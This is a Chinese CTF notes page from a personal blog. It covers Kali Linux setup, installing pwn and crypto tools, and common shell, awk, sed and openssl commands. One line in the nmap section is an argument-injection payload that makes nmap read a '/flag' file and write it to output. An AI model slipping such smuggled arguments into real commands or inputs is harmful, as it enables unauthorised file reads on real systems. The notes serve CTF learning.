<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>wgf4242&#39;s Blog</title>
    <meta name="generator" content="VuePress 1.5.2">
    
    <meta name="description" content="Just playing around">
    <link rel="preload" href="/text_del/assets/css/0.styles.cf9e26c4.css" as="style"><link rel="preload" href="/text_del/assets/js/app.019b619e.js" as="script"><link rel="preload" href="/text_del/assets/js/4.6ff137c7.js" as="script"><link rel="preload" href="/text_del/assets/js/1.9204637f.js" as="script"><link rel="preload" href="/text_del/assets/js/41.8a59c4b1.js" as="script"><link rel="prefetch" href="/text_del/assets/js/10.da189038.js"><link rel="prefetch" href="/text_del/assets/js/11.3d0e03b5.js"><link rel="prefetch" href="/text_del/assets/js/12.3faa4588.js"><link rel="prefetch" href="/text_del/assets/js/13.1493b10c.js"><link rel="prefetch" href="/text_del/assets/js/14.45d45f77.js"><link rel="prefetch" href="/text_del/assets/js/15.336d299e.js"><link rel="prefetch" href="/text_del/assets/js/16.1a315ea1.js"><link rel="prefetch" href="/text_del/assets/js/17.6f820353.js"><link rel="prefetch" href="/text_del/assets/js/18.2085ebc4.js"><link rel="prefetch" href="/text_del/assets/js/19.f482eb9c.js"><link rel="prefetch" href="/text_del/assets/js/2.aa1a6213.js"><link rel="prefetch" href="/text_del/assets/js/20.1424f939.js"><link rel="prefetch" href="/text_del/assets/js/21.7bab9fac.js"><link rel="prefetch" href="/text_del/assets/js/22.43336c87.js"><link rel="prefetch" href="/text_del/assets/js/23.d0c26cd8.js"><link rel="prefetch" href="/text_del/assets/js/24.1e754fff.js"><link rel="prefetch" href="/text_del/assets/js/25.62cbf33e.js"><link rel="prefetch" href="/text_del/assets/js/26.59217b9a.js"><link rel="prefetch" href="/text_del/assets/js/27.9a4d1423.js"><link rel="prefetch" href="/text_del/assets/js/28.188c8c80.js"><link rel="prefetch" href="/text_del/assets/js/29.81e7b24d.js"><link rel="prefetch" href="/text_del/assets/js/30.cc38b5af.js"><link rel="prefetch" href="/text_del/assets/js/31.eff58e26.js"><link rel="prefetch" href="/text_del/assets/js/32.e01b5910.js"><link rel="prefetch" href="/text_del/assets/js/33.54e528f3.js"><link rel="prefetch" href="/text_del/assets/js/34.32589a65.js"><link rel="prefetch" href="/text_del/assets/js/35.e7fae8d8.js"><link rel="prefetch" href="/text_del/assets/js/36.eb73ffb8.js"><link rel="prefetch" href="/text_del/assets/js/37.4ccb1d44.js"><link rel="prefetch" href="/text_del/assets/js/38.c8931134.js"><link rel="prefetch" href="/text_del/assets/js/39.0f94f3b9.js"><link rel="prefetch" href="/text_del/assets/js/40.0ff7aa51.js"><link rel="prefetch" href="/text_del/assets/js/42.1e8a645e.js"><link rel="prefetch" href="/text_del/assets/js/43.146edede.js"><link rel="prefetch" href="/text_del/assets/js/44.547663ab.js"><link rel="prefetch" href="/text_del/assets/js/45.86cc5dff.js"><link rel="prefetch" href="/text_del/assets/js/46.478f9d7a.js"><link rel="prefetch" href="/text_del/assets/js/47.a8a06b27.js"><link rel="prefetch" href="/text_del/assets/js/48.e4fc9beb.js"><link rel="prefetch" href="/text_del/assets/js/49.24429e93.js"><link rel="prefetch" href="/text_del/assets/js/5.18a871e9.js"><link rel="prefetch" href="/text_del/assets/js/50.6c537fc7.js"><link rel="prefetch" href="/text_del/assets/js/51.faef1963.js"><link rel="prefetch" href="/text_del/assets/js/52.c13641a3.js"><link rel="prefetch" href="/text_del/assets/js/53.464b5616.js"><link rel="prefetch" href="/text_del/assets/js/54.e7c1ed12.js"><link rel="prefetch" href="/text_del/assets/js/55.493db0fd.js"><link rel="prefetch" href="/text_del/assets/js/56.8a03de0f.js"><link rel="prefetch" href="/text_del/assets/js/57.f1b9e010.js"><link rel="prefetch" href="/text_del/assets/js/6.71aa5eb7.js"><link rel="prefetch" href="/text_del/assets/js/7.e82d5ddf.js"><link rel="prefetch" href="/text_del/assets/js/8.ffe0ad43.js"><link rel="prefetch" href="/text_del/assets/js/9.e9439c4b.js">
    <link rel="stylesheet" href="/text_del/assets/css/0.styles.cf9e26c4.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container" data-v-19557b78><div data-v-19557b78><div id="loader-wrapper" class="loading-wrapper" data-v-d48f4d20 data-v-19557b78 data-v-19557b78><div class="loader-main" data-v-d48f4d20><div data-v-d48f4d20></div><div data-v-d48f4d20></div><div data-v-d48f4d20></div><div data-v-d48f4d20></div></div> <!----> <!----></div> <div class="password-shadow password-wrapper-out" style="display:none;" data-v-64685f0e data-v-19557b78 data-v-19557b78><h3 class="title" style="display:none;" data-v-64685f0e data-v-64685f0e>wgf4242's Blog</h3> <!----> <label id="box" class="inputBox" style="display:none;" data-v-64685f0e data-v-64685f0e><input type="password" value="" data-v-64685f0e> <span data-v-64685f0e>Konck! Knock!</span> <button data-v-64685f0e>OK</button></label> <div class="footer" style="display:none;" data-v-64685f0e data-v-64685f0e><span data-v-64685f0e><i class="iconfont reco-theme" data-v-64685f0e></i> <a target="blank" href="https://vuepress-theme-reco.recoluan.com" data-v-64685f0e>vuePress-theme-reco</a></span> <span data-v-64685f0e><i class="iconfont reco-copyright" data-v-64685f0e></i> <a data-v-64685f0e><span data-v-64685f0e>wgf4242's Blog</span>
            
          <!---->
          2020
        </a></span></div></div> <div class="hide" data-v-19557b78><header class="navbar" data-v-19557b78><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/text_del/" class="home-link router-link-active"><!----> <span class="site-name">wgf4242's Blog</span></a> <div class="links"><div class="color-picker"><a class="color-button"><i class="iconfont reco-color"></i></a> <div class="color-picker-menu" style="display:none;"><div class="mode-options"><h4 class="title">Choose mode</h4> <ul class="color-mode-options"><li class="dark">dark</li><li class="auto active">auto</li><li class="light">light</li></ul></div></div></div> <div class="search-box"><i class="iconfont reco-search"></i> <input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/text_del/home/" class="nav-link"><i class="iconfont undefined"></i>
  主页
</a></div><div class="nav-item"><div class="dropdown-wrapper"><a class="dropdown-title"><span class="title"><i class="iconfont undefined"></i>
      文章
    </span> <span class="arrow right"></span></a> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/text_del/article/technology/" class="nav-link"><i class="iconfont undefined"></i>
  技术
</a></li><li class="dropdown-item"><!----> <a href="/text_del/article/essay/" class="nav-link"><i class="iconfont undefined"></i>
  随笔
</a></li><li class="dropdown-item"><!----> <a href="/text_del/article/other/" class="nav-link"><i class="iconfont undefined"></i>
  其他
</a></li></ul></div></div><div class="nav-item"><a href="/text_del/about/" class="nav-link"><i class="iconfont undefined"></i>
  关于
</a></div><div class="nav-item"><a href="https://www.github.com/wgf4242" target="_blank" rel="noopener noreferrer" class="nav-link external"><i class="iconfont undefined"></i>
  Github
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></div> <!----></nav></div></header> <div class="sidebar-mask" data-v-19557b78></div> <aside class="sidebar" data-v-19557b78><div class="personal-info-wrapper" data-v-042e23d4><!----> <h3 class="name" data-v-042e23d4>
    wgf4242's Blog
  </h3> <div class="num" data-v-042e23d4><div data-v-042e23d4><h3 data-v-042e23d4>0</h3> <h6 data-v-042e23d4>Article</h6></div> <div data-v-042e23d4><h3 data-v-042e23d4>0</h3> <h6 data-v-042e23d4>Tag</h6></div></div> <hr data-v-042e23d4></div> <nav class="nav-links"><div class="nav-item"><a href="/text_del/home/" class="nav-link"><i class="iconfont undefined"></i>
  主页
</a></div><div class="nav-item"><div class="dropdown-wrapper"><a class="dropdown-title"><span class="title"><i class="iconfont undefined"></i>
      文章
    </span> <span class="arrow right"></span></a> <ul class="nav-dropdown" style="display:none;"><li class="dropdown-item"><!----> <a href="/text_del/article/technology/" class="nav-link"><i class="iconfont undefined"></i>
  技术
</a></li><li class="dropdown-item"><!----> <a href="/text_del/article/essay/" class="nav-link"><i class="iconfont undefined"></i>
  随笔
</a></li><li class="dropdown-item"><!----> <a href="/text_del/article/other/" class="nav-link"><i class="iconfont undefined"></i>
  其他
</a></li></ul></div></div><div class="nav-item"><a href="/text_del/about/" class="nav-link"><i class="iconfont undefined"></i>
  关于
</a></div><div class="nav-item"><a href="https://www.github.com/wgf4242" target="_blank" rel="noopener noreferrer" class="nav-link external"><i class="iconfont undefined"></i>
  Github
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></div> <!----></nav>  <ul class="sidebar-links"><li><section class="sidebar-group depth-0"><p class="sidebar-heading open"><span></span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/text_del/ctf/kali_linux.html#init" class="sidebar-link">Init</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/text_del/ctf/kali_linux.html#init-2" class="sidebar-link">Init 2</a></li><li class="sidebar-sub-header"><a href="/text_del/ctf/kali_linux.html#sage-安装" class="sidebar-link">sage 安装</a></li><li class="sidebar-sub-header"><a href="/text_del/ctf/kali_linux.html#install-edb" class="sidebar-link">install edb</a></li></ul></li><li><a href="/text_del/ctf/kali_linux.html#常用命令" class="sidebar-link">常用命令</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/text_del/ctf/kali_linux.html#调试相关" class="sidebar-link">调试相关</a></li><li class="sidebar-sub-header"><a href="/text_del/ctf/kali_linux.html#查看文件" class="sidebar-link">查看文件</a></li><li class="sidebar-sub-header"><a href="/text_del/ctf/kali_linux.html#字符串处理-string" class="sidebar-link">字符串处理 String</a></li><li class="sidebar-sub-header"><a href="/text_del/ctf/kali_linux.html#vim" class="sidebar-link">vim</a></li><li class="sidebar-sub-header"><a href="/text_del/ctf/kali_linux.html#启动服务-mysql" class="sidebar-link">启动服务 mysql</a></li></ul></li><li><a href="/text_del/ctf/kali_linux.html#关键字" class="sidebar-link">关键字</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/text_del/ctf/kali_linux.html#web" class="sidebar-link">Web</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/text_del/ctf/kali_linux.html#基本知识" class="sidebar-link">基本知识</a></li><li class="sidebar-sub-header"><a href="/text_del/ctf/kali_linux.html#php" class="sidebar-link">php</a></li><li class="sidebar-sub-header"><a href="/text_del/ctf/kali_linux.html#web-工具" class="sidebar-link">Web 工具</a></li><li class="sidebar-sub-header"><a href="/text_del/ctf/kali_linux.html#一些-php-code" class="sidebar-link">一些 php code</a></li><li class="sidebar-sub-header"><a href="/text_del/ctf/kali_linux.html#提示" class="sidebar-link">提示</a></li><li class="sidebar-sub-header"><a href="/text_del/ctf/kali_linux.html#隐写" class="sidebar-link">隐写</a></li><li class="sidebar-sub-header"><a href="/text_del/ctf/kali_linux.html#加密解密" class="sidebar-link">加密解密</a></li><li class="sidebar-sub-header"><a href="/text_del/ctf/kali_linux.html#暴力破解" class="sidebar-link">暴力破解</a></li></ul></li><li><a href="/text_del/ctf/kali_linux.html#hydra-sh暴破" class="sidebar-link">hydra sh暴破</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/text_del/ctf/kali_linux.html#字典工具" class="sidebar-link">字典工具</a></li></ul></li><li><a href="/text_del/ctf/kali_linux.html#未来学习" class="sidebar-link">未来学习</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/text_del/ctf/kali_linux.html#awd" class="sidebar-link">AWD</a></li></ul></li><li><a href="/text_del/ctf/kali_linux.html#其他" class="sidebar-link">其他</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/text_del/ctf/kali_linux.html#save" class="sidebar-link">save</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/text_del/ctf/kali_linux.html#gdb-调试" class="sidebar-link">GDB 调试</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/text_del/ctf/kali_linux.html#peda" class="sidebar-link">peda</a></li><li class="sidebar-sub-header"><a href="/text_del/ctf/kali_linux.html#gdb" class="sidebar-link">gdb</a></li></ul></li><li><a href="/text_del/ctf/kali_linux.html#vmware-共享文件夹" class="sidebar-link">Vmware 共享文件夹</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/text_del/ctf/kali_linux.html#添加开机项-方法1" class="sidebar-link">添加开机项-方法1</a></li><li class="sidebar-sub-header"><a href="/text_del/ctf/kali_linux.html#添加开机项-方法2" class="sidebar-link">添加开机项-方法2</a></li><li class="sidebar-sub-header"><a href="/text_del/ctf/kali_linux.html#移除开机启动项" class="sidebar-link">移除开机启动项</a></li><li class="sidebar-sub-header"><a href="/text_del/ctf/kali_linux.html#添加开机项4" class="sidebar-link">添加开机项4</a></li></ul></li><li><a href="/text_del/ctf/kali_linux.html#shell-脚本语法" class="sidebar-link">Shell 脚本语法</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/text_del/ctf/kali_linux.html#faq" class="sidebar-link">FAQ</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/text_del/ctf/kali_linux.html#中文乱码" class="sidebar-link">中文乱码</a></li><li class="sidebar-sub-header"><a href="/text_del/ctf/kali_linux.html#怎样离线安装软件包？" class="sidebar-link">怎样离线安装软件包？</a></li></ul></li><li><a href="/text_del/ctf/kali_linux.html#gcc-使用" class="sidebar-link">gcc 使用</a><ul class="sidebar-sub-headers"></ul></li><li><a href="/text_del/ctf/kali_linux.html#to-save-to-workflow" class="sidebar-link">TO save to workflow</a><ul class="sidebar-sub-headers"></ul></li></ul></section></li></ul> </aside> <div class="password-shadow password-wrapper-in" style="display:none;" data-v-64685f0e data-v-19557b78><h3 class="title" style="display:none;" data-v-64685f0e data-v-64685f0e></h3> <!----> <label id="box" class="inputBox" style="display:none;" data-v-64685f0e data-v-64685f0e><input type="password" value="" data-v-64685f0e> <span data-v-64685f0e>Konck! Knock!</span> <button data-v-64685f0e>OK</button></label> <div class="footer" style="display:none;" data-v-64685f0e data-v-64685f0e><span data-v-64685f0e><i class="iconfont reco-theme" data-v-64685f0e></i> <a target="blank" href="https://vuepress-theme-reco.recoluan.com" data-v-64685f0e>vuePress-theme-reco</a></span> <span data-v-64685f0e><i class="iconfont reco-copyright" data-v-64685f0e></i> <a data-v-64685f0e><span data-v-64685f0e>wgf4242's Blog</span>
            
          <!---->
          2020
        </a></span></div></div> <div data-v-19557b78><main class="page"><div class="page-title" style="display:none;"><h1></h1> <hr> <div data-v-34ea29db><i class="iconfont reco-account" data-v-34ea29db><span data-v-34ea29db>wgf4242's Blog</span></i> <!----> <!----> <!----></div></div> <div class="theme-reco-content content__default" style="display:none;"><p>[TOC]</p> <h1 id="kali"><a href="#kali" class="header-anchor">#</a> Kali</h1> <p>192.168.100.234 255.255.255.0 192.168.100.1</p> <h2 id="init"><a href="#init" class="header-anchor">#</a> Init</h2> <div class="language- extra-class"><pre><code>sudo nano /etc/apt/sources.list
</code></pre></div><p>Repositories :</p> <div class="language- extra-class"><pre><code>deb http://kali.cs.nctu.edu.tw/kali kali-rolling main contrib non-free
deb http://http.kali.org/kali kali-rolling main non-free contrib
deb-src http://http.kali.org/kali kali-rolling main non-free contrib
deb http://http.kali.org/kali kali-rolling main non-free contrib
</code></pre></div><h3 id="init-2"><a href="#init-2" class="header-anchor">#</a> Init 2</h3> <p>sudo apt-get update
sudo apt-get install -y checksec foremost gdb libgmp3-dev libmpc-dev python3-pip g++ libssl-dev zlib1g-dev gnuplot steghide outguess volatility texinfo terminator ncat
gem sources --remove https://rubygems.org/
gem sources --add https://gems.ruby-china.com/
gem sources -l
sudo gem install one_gadget</p> <p>echo &quot;------Add path to bash&quot;
echo export PATH=$PATH:/home/$USER/.local/bin &gt;&gt; ~/.bashrc</p> <p>echo &quot;------Install gdb-peda -------&quot;
git clone https://github.com/longld/peda.git ~/peda
echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit
echo &quot;DONE! debug your program with gdb and enjoy&quot;</p> <p>sudo gzip -d /usr/share/wordlists/rockyou.txt.gz</p> <p>echo &quot;------Install pip file -------&quot;
mkdir ~/.pip &amp;&amp; cat &lt;<EOT>&gt; ~/.pip/pip.conf
[global]
index-url = https://pypi.tuna.tsinghua.edu.cn/simple
[install]
trusted-host=mirrors.aliyun.com
EOT
echo &quot;------pip install file -------&quot;
pip3 install gmpy2 pycrypto rsa pillow pwntools angr ropgadget wscan xortools flask-unsign
pip install utf9</EOT></p> <p>echo &quot;------Config vim -------&quot;
echo &quot;set mouse=c&quot;&gt;&gt;~/.vimrc</p> <p>echo &quot;------In Downloads -------&quot;
cd ~/Downloads
echo &quot;get pwndbg&quot;
git clone https://github.com/pwndbg/pwndbg</p> <p>echo &quot;----------checksec file alias as cf&quot;
echo &quot;alias cf='func() { checksec --file=$1;}; func'&quot; &gt;&gt; ~/.bashrc</p> <p>echo &quot;----------RsaCtfTool&quot;
git clone https://github.com/Ganapati/RsaCtfTool.git
cd ..</p> <p>sudo gem install zsteg</p> <h4 id="考虑安装-sage"><a href="#考虑安装-sage" class="header-anchor">#</a> 考虑安装 sage</h4> <p>echo &quot;----------sage&quot;
wget https://mirrors.tuna.tsinghua.edu.cn/sagemath/linux/64bit/sage-9.0-Ubuntu_18.04-x86_64.tar.bz2
tar -xvjf sage-9.0-Ubuntu_18.04-x86_64.tar.bz2
sudo ln -s <code>pwd</code>/SageMath/sage /usr/local/bin/sage
./sage</p> <h4 id="考虑安装-pwndbg"><a href="#考虑安装-pwndbg" class="header-anchor">#</a> 考虑安装 pwndbg</h4> <div class="language- extra-class"><pre><code>cd ~/Downloads/pwndbg
./setup.sh

pwndbg在调试堆的数据结构时候很方便

peda在查找字符串等功能时方便

安装peda：

git clone https://github.com/longld/peda.git ~/peda
安装gef：

# via the install script
$ wget -q -O- https://github.com/hugsy/gef/raw/master/scripts/gef.sh | sh
 
# manually
$ wget -O ~/.gdbinit-gef.py -q https://github.com/hugsy/gef/raw/master/gef.py
$ echo source ~/.gdbinit-gef.py &gt;&gt; ~/.gdbinit
切换gdb的调试工具pwndbg或peda：

vim ~/.gdbinit
source ~/peda/peda.py
把第二行添加到gdbinit的配置文件中去，把pwndbg的注释掉，即可切换为peda

选中gef的话，即添加一行：

source ~/.gdbinit-gef.py
并把其他两行注释掉即可
</code></pre></div><h4 id="proxy"><a href="#proxy" class="header-anchor">#</a> proxy</h4> <p>export http_proxy=http://192.168.42.116:1080
export https_proxy=http://192.168.42.116:1080
export no_proxy=localhost</p> <h3 id="sage-安装"><a href="#sage-安装" class="header-anchor">#</a> sage 安装</h3> <p>https://www.jianshu.com/p/ddf9376334cd</p> <ol><li><p>进入 http://www.sagemath.org/download-linux.html 下载</p></li> <li><p>解压 tar -xjf *.tar.bz2</p></li> <li><p>sudo ln -s /path/to/SageMath/sage /usr/local/bin/sage</p></li></ol> <h3 id="install-edb"><a href="#install-edb" class="header-anchor">#</a> install edb</h3> <div class="language- extra-class"><pre><code># install dependencies
sudo apt-get install -y cmake build-essential libboost-dev libqt5xmlpatterns5-dev qtbase5-dev qt5-default libqt5svg5-dev libgraphviz-dev libcapstone-dev pkg-config

# build and run edb
git clone --recursive https://github.com/eteran/edb-debugger.git
cd edb-debugger
mkdir build
cd build
cmake ..
make
./edb
</code></pre></div><h2 id="常用命令"><a href="#常用命令" class="header-anchor">#</a> 常用命令</h2> <p>打开当前文件夹在terminal</p> <p>xdg-open .</p> <p>man 帮助</p> <p>man 1 ls      man1是普通的shell命令比bai如ls
man 2 open    man2是系统调用比如open，write说明，
man 3 printf  man3是函数说明</p> <p>dd if=源文件名 bs=1 skip=开始分离的字节数 of=输出文件名</p> <p>man [command] 查看帮助, 如 man atoi</p> <p>ctrl z 挂起到后台
fg 程序回到前台
bg 显示后台程序
ctrl d 停止当前程序</p> <p>ss -tnl
netstat -pantu</p> <p>find</p> <div class="language- extra-class"><pre><code>find / -iname xxxx.jpg
</code></pre></div><p>grep</p> <div class="language- extra-class"><pre><code>grep  &quot;flag&quot; -r -a * 
</code></pre></div><p>strings xiaojiejie.jpeg | grep -E &quot;{[a-z]{4,}&quot;</p> <p>strings -a -t x libc_32.so.6 | grep &quot;/bin/sh&quot;</p> <div class="language- extra-class"><pre><code># -a 扫描全段
# -t 输出字符位置， 基于8进制、10进制或16进制
</code></pre></div><p>python filemonitor.py &amp;
&amp;后台运行
who 查看谁连接了服务器
pts 为远程终端
pkill -kill -t pts/0 # /后面0是终端号</p> <h3 id="调试相关"><a href="#调试相关" class="header-anchor">#</a> 调试相关</h3> <p>如何用脚本输入程序运行参数：</p> <div class="language- extra-class"><pre><code>l ./pwn1 `python -c &quot;print 'a'*28&quot;`
2 ./pwn1 $(python -c &quot;print 'a'*28&quot;)
3. echo `python -c &quot;print 'a'*28&quot;`
</code></pre></div><p>cyclic 100</p> <div class="language- extra-class"><pre><code>生成100个字符
</code></pre></div><p>16进制显示</p> <div class="language- extra-class"><pre><code>./fmt_write.c | xxd 
</code></pre></div><p>locate my.cnf</p> <p>du -sh *
du -sh * | sort -n 统计当前文件夹(目录)大小，并按文件大小排序
du -lh --max-depth=1 : 查看当前目录下一级子文件和子目录占用的磁盘容量。
du -sk filename 查看指定文件大小
df -h 查看系统中文件的使用情况</p> <div class="language- extra-class"><pre><code>df参数：

-a：列出所有的文件系统，包括系统特有的/proc等文件系统

-k：以KB的容量显示各文件系统

-m：以MB的容量显示各文件系统

-h：以人们较易阅读的GB,MB,KB等格式自行显示

-H：以M=1000K替代M=1024K的进位方式

-T：连同该分区的文件系统名称（例如ext3）也列出

-i：不用硬盘容量，而以inode的数量来显示
</code></pre></div><p>nmap</p> <div class="language- extra-class"><pre><code>127.0.0.1' -iL /flag -oN vege.txt ' # nmap 读取文件
-iL nmaptest.txt  # 扫描文件中列出的所有IP地址
-oN vege.txt # 保存扫描结果到 vege.txt
</code></pre></div><h3 id="查看文件"><a href="#查看文件" class="header-anchor">#</a> 查看文件</h3> <p>cat, more, less</p> <div class="language- extra-class"><pre><code>less 与 more 类似，但使用 less 可以随意浏览文件，而 more 仅能向前移动，却不能向后移动，而且 less 在查看之前不会加载整个文件。
</code></pre></div><h3 id="字符串处理-string"><a href="#字符串处理-string" class="header-anchor">#</a> 字符串处理 String</h3> <p>cat 显示文件</p> <div class="language- extra-class"><pre><code>输出多行到文本
cat &lt;&lt;EOT &gt;&gt; ~/twolines
line1
line2
EOT
</code></pre></div><p>相同行合并字串 paste file1 file2</p> <div class="language- extra-class"><pre><code>cat file1
    1
    2
cat file2
    a
    b
paste file1 file2
    1 a
    2 b
paste -d: file1 file2
    1:a
    2:b
</code></pre></div><p>awk</p> <div class="language- extra-class"><pre><code>以逗号分割，打印2,3列
用-F指定一个或者多个
cat test.csv | awk -F &quot;,&quot; '{print $2,$3}'
也可以用BEGIN块+FS来处理，OFS表示输出的分隔符
cat test.csv | awk 'BEGIN{FS=&quot;,&quot;;OFS=&quot;;&quot; }{ print $2,$3}'

NR:表示当前记录数
FNR:也表示当前记录数，但是FNR的作用域只在一个文件内.如果重新打开文件,FNR会从1开始.

合并追加
$ awk 'NR==FNR{a[$2]=$0;next}NR&gt;FNR{if($1 in a)print a[$1],$2}' fil1 file2&gt;file3
    当NR==FNR为真时,判断当前读入的是第一个文件，然后使用{a[$2]=$0;next}循环将第一个文件的每行记录都存入数组a,并使用$2第2个字段cid作为下标引用.
    由NR&gt;FNR为假时,判断当前读入了第二个文件，然后判断第二个文件的第一个字段cid是否在数组a中，如果在的话执行{print a[$1],$2}，打印出数组a和第二个文件的第二个字段此时变量$1为第二个文件的第一个字段,与读入第一个文件时,采用第一个文件第二个字段$2 status。最后将经过输出到file3中。
    $ cat fil1
    st cid name
    1 111 wy
    2 222 xlx
    3 333 ww
    4 444 yyy

    $ cat file2
    cid status
    111 a
    222 b
    333 c

    $ cat file3
    st cid name status
    1 111 wy a
    2 222 xlx b
    3 333 ww c
</code></pre></div><p>sed</p> <div class="language- extra-class"><pre><code>sed -i &quot;s/F;/\?/g&quot;  isFraud.csv  // F; 替换为 ?
sed -i &quot;s/T;/\?/g&quot;  isFraud.csv  // T; 替换为 ?
</code></pre></div><h3 id="vim"><a href="#vim" class="header-anchor">#</a> vim</h3> <p>永久配置</p> <div class="language- extra-class"><pre><code>vim ~/.vimrc
# 解决不能复制
set mouse=c
</code></pre></div><h4 id="shell-等加密常用"><a href="#shell-等加密常用" class="header-anchor">#</a> Shell 等加密常用</h4> <p><a href="https://www.cnblogs.com/misswangxing/p/10911969.html" target="_blank" rel="noopener noreferrer">dd<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a>将bmp文件0x1171a9后面取出来。</p> <div class="language- extra-class"><pre><code>dd if=./phrack.bmp of=out.png ibs=0x1171a9 skip=1 count=1
</code></pre></div><p>echo 1 | sha256sum</p> <div class="language- extra-class"><pre><code>sha1deep      sha224sum     sha256sum     sha512sum
sha1sum       sha256deep    shasum    md5sum
</code></pre></div><p>echo -n 155989|openssl dgst -sha256</p> <div class="language- extra-class"><pre><code># -n 不输入 newline
</code></pre></div><p>echo -n &quot;message&quot; | sha1sum</p> <p>echo abc | openssl base64</p> <p>echo YWJjCg== | openssl base64 -d</p> <p>openssl base64 -d -in t.base64</p> <p><strong>二. 利用openssl命令进行md5/sha1摘要（digest）</strong></p> <ol><li><p>对字符串'abc'进行md5摘要计算：<code>echo abc | openssl md5</code></p></li> <li><p>若对某文件进行md5摘要计算：<code>openssl md5 -in t.txt</code></p></li> <li><p>对字符串'abc'进行sha1摘要计算：<code>echo abc | openssl sha1</code></p></li> <li><p>若对某文件进行sha1摘要计算：<code>openssl sha1 -in t.txt</code></p></li></ol> <p><strong>三. 利用openssl命令进行AES/DES3加密解密（AES/DES3 encrypt/decrypt）</strong></p> <p>对字符串'abc'进行aes加密，使用密钥123，输出结果以base64编码格式给出：</p> <div class="language- extra-class"><pre><code>	# echo abc | openssl aes-128-cbc -k 123 -base64
	U2FsdGVkX18ynIbzARm15nG/JA2dhN4mtiotwD7jt4g=   （结果）
</code></pre></div><p>对以上结果进行解密处理：</p> <div class="language- extra-class"><pre><code>	# echo U2FsdGVkX18ynIbzARm15nG/JA2dhN4mtiotwD7jt4g= | openssl aes-128-cbc -d -k 123 -base64
	abc  （结果）
</code></pre></div><p>若要从文件里取原文（密文）进行加密（解密），只要指定 -in 参数指向文件名就可以了。</p> <p>进行des3加解密，只要把命令中的aes-128-cbc换成des3就可以了。</p> <h4 id="（（表达式1-表达式2…））"><a href="#（（表达式1-表达式2…））" class="header-anchor">#</a> （（表达式1,表达式2…））</h4> <p>特点：</p> <div class="language- extra-class"><pre><code>1、在双括号结构中，所有表达式可以像c语言一样，如：a++,b--等。
2、在双括号结构中，所有变量可以不加入：“$”符号前缀。
3、双括号可以进行逻辑运算，四则运算
4、双括号结构 扩展了for，while,if条件测试运算
5、支持多个表达式运算，各个表达式之间用“，”分开
